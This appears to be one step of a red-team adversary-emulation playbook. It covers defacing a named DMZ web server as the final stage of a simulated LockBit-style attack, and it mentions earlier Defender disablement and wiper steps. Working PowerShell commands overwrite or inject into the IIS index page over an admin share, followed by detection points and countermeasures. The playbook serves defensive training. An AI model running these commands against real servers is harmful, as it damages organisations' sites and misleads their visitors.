
# Step 6: Deface Public-Facing Web Server

**Objective**: Modify the web content of the external server (`dmz-web-elcoop-1`) to simulate public-facing defacement for psychological or ideological impact.

---

## Context

- Previous actions (Defender disablement and wiper execution) have already been triggered.
- This step mimics the behavior of ransomware or hacktivist groups, leaving a visible message.
- The Red Team still has beacon access to the environment (e.g., via `infra-dc1`).

---

## Execution

### 1. Locate the Web Root Directory

Assuming a standard IIS deployment:

```plaintext
\\dmz-web-elcoop-1\c$\inetpub\wwwroot\index.html
```

### 2. Modify Web Page Content

#### Option A: Overwrite the home page

```powershell
Copy-Item -Path C:\RedTeam\deface.html -Destination \\dmz-web-elcoop-1\c$\inetpub\wwwroot\index.html -Force
```

#### Option B: Inject message into existing HTML

```powershell
Add-Content -Path \\dmz-web-elcoop-1\c$\inetpub\wwwroot\index.html -Value "<!-- Hacked by LockBit // Data has been encrypted -->"
```

### 3. Validate Defacement

Confirm visually or with PowerShell:

```powershell
Invoke-WebRequest http://dmz-web-elcoop-1 | Select-Object -ExpandProperty Content
```

---

## Result

- The organization’s external website is visibly defaced
- Simulates final stage of a LockBit-style operation
- Adds psychological pressure to the impact already delivered

---

## Detection Opportunities

| Vector | Description |
|--------|-------------|
| File Write | Changes to `inetpub\wwwroot\index.html` |
| SMB Logs | Internal system writing to web server |
| Web Logs | Modified content served from index page |

---

## Defensive Countermeasures

- Enable **File Integrity Monitoring (FIM)** on web roots
- Restrict internal write access to DMZ systems via ACLs
- Segment DMZ assets from internal admin systems (Zero Trust)
- Deploy WAF or EDR tools with content change alerting

